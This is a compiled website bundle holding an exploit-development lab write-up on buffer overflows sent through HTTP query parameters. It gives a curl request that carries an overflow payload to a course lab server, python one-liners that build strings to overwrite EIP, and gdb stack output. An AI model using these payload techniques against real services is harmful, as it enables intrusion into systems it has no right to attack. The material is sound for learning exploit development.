"use strict";(self.webpackChunkkgkb=self.webpackChunkkgkb||[]).push([[33359],{75214:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>c,contentTitle:()=>s,default:()=>U,frontMatter:()=>a,metadata:()=>o,toc:()=>l});var t=r(74848),i=r(28453);const a={},s="Buffer Overflow with HTTP Query Parameters",o={id:"cybersecurity/Offensive/Exploit Development/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_query_params/README",title:"Buffer Overflow with HTTP Query Parameters",description:"https://samsclass.info/127/proj/ED202c.htm",source:"@site/docs/cybersecurity/Offensive/Exploit Development/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_query_params/README.md",sourceDirName:"cybersecurity/Offensive/Exploit Development/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_query_params",slug:"/cybersecurity/Offensive/Exploit Development/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_query_params/",permalink:"/docs/cybersecurity/Offensive/Exploit Development/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_query_params/",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Web Application Enumeration Tools",permalink:"/docs/cybersecurity/Offensive/Enumeration/web-enumeration-tools"},next:{title:"Linux Buffer Overflow with Listening Shell",permalink:"/docs/cybersecurity/Offensive/Exploit Development/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_with_listening_shell/"}},c={},l=[{value:"Example 1: Sending a number in payload",id:"example-1-sending-a-number-in-payload",level:2},{value:"Example 2: Non-Existant Hexadecimal Value",id:"example-2-non-existant-hexadecimal-value",level:2}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"buffer-overflow-with-http-query-parameters",children:"Buffer Overflow with HTTP Query Parameters"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://samsclass.info/127/proj/ED202c.htm",children:"https://samsclass.info/127/proj/ED202c.htm"})}),"\n",(0,t.jsxs)(n.p,{children:["When we create a buffer overflow by sending an HTTP request to a server and need to send a number to the stack, we can do so by adding ",(0,t.jsx)(n.code,{children:"%"})," before the needed character/number."]}),"\n",(0,t.jsx)(n.h2,{id:"example-1-sending-a-number-in-payload",children:"Example 1: Sending a number in payload"}),"\n",(0,t.jsx)(n.p,{children:"For example, suppose we want to get the flag if the 31st character of some key has to equal 7:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:'    if (key[30] == 7) {\n        printf("Congratulations!  The first flag is XXXXXXXXXXXXXXXXX\\n");\n    }\n'})}),"\n",(0,t.jsxs)(n.p,{children:["We can generate the key we need and append the ",(0,t.jsx)(n.code,{children:"%07"})," to it:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:"print('U'*30 + '%07')\nUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU%07\n"})}),"\n",(0,t.jsx)(n.p,{children:"Send the request:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"curl -X GET https://attack.samsclass.info/ED202e/ED202.5b.php?string=UUUUUUUUUUUUUUUUUUUUUUUUUUUUUU%07&submit=debug\n"})}),"\n",(0,t.jsx)(n.p,{children:"And we get the key:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"Executing gdb command: continue\nEnter product key: Congratulations!  The first flag is SPECIAL-CHARACTER\n\nProgram received signal SIGSEGV, Segmentation fault.\n"})}),"\n",(0,t.jsx)(n.h2,{id:"example-2-non-existant-hexadecimal-value",children:"Example 2: Non-Existant Hexadecimal Value"}),"\n",(0,t.jsxs)(n.p,{children:["Another example would be if we know that the we want to send the EIP to the address ",(0,t.jsx)(n.code,{children:"0x565556dc"}),". The problem here is that the ",(0,t.jsx)(n.code,{children:"\\xdc"})," hex value doesn't represent an ASCII character. So sending the little Endian address would generate a ",(0,t.jsx)(n.code,{children:"0x00"})," instead in the stack:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"\u276f python2 -c \"print 'U'*37+ '\\xdc\\x56\\x55\\x56'\"\nUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUVUV\n"})}),"\n",(0,t.jsxs)(n.p,{children:["See value in bottom right corner (",(0,t.jsx)(n.code,{children:"0x00565556"}),"):"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"(gdb) x/40x $esp\n\n0xffffdc20:\t0xf7fe76eb\t0x55557000\t0x55555555\t0x55555555\n0xffffdc30:\t0x55555555\t0x55555555\t0x55555555\t0x55555555\n0xffffdc40:\t0x55555555\t0x55555555\t0x55555555\t0x00565556\n"})}),"\n",(0,t.jsxs)(n.p,{children:["To work around this, we can insert ",(0,t.jsx)(n.code,{children:"%dc"})," instead:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"\u276f python2 -c \"print 'U'*37+ '%dc\\x56\\x55\\x56'\"\nUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU%dcVUV\n"})})]})}function U(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},28453:(e,n,r)=>{r.d(n,{R:()=>s,x:()=>o});var t=r(96540);const i={},a=t.createContext(i);function s(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:s(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);